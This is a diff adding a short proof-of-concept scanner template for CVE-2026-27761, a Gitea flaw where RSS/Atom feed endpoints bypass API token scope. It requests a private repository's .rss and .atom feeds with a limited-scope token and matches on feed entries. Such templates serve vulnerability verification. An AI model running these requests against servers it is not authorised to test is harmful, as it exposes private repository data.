@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "验证 Gitea 仓库 RSS/Atom Feed 端点是否绕过 API 令牌作用域检查。使用受限作用域（如 read:issue）的个人访问令牌访问私有仓库的 RSS/Atom Feed 接口，若返回提交记录数据则说明存在权限绕过漏洞。"
+id = "POC-AVE-2026-0254"
+name = "Gitea RSS/Atom Feed API Token Scope Bypass PoC"
+severity = "medium"
+tags = ["ave-2026-0254"]
+vuln_id = [
+    "CVE-2026-27761",
+    "AVE-2026-0254",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{owner}}/{{repo}}.rss"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<entry>",
+    "<title>",
+    "<author>",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{owner}}/{{repo}}.atom"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<entry>",
+    "<title>",
+    "<author>",
+]
